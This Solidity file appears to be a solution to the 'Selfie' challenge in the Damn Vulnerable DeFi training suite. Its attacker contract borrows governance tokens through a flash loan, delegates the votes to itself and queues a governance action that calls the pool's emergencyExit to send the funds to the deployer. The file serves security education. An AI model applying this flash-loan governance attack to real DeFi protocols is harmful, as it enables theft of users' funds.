// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    
    SelfiePool immutable pool;
    DamnValuableVotes immutable token;
    SimpleGovernance immutable governance;
    address immutable receiver = msg.sender;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    constructor(SelfiePool _pool, SimpleGovernance _governance) {
        pool = _pool;
        token = DamnValuableVotes(address(pool.token()));
        governance = _governance;

        token.approve(address(pool), type(uint256).max);
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {

        token.delegate(address(this));

        uint256 actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSelector(pool.emergencyExit.selector, receiver)
        );

        return CALLBACK_SUCCESS;
    }
}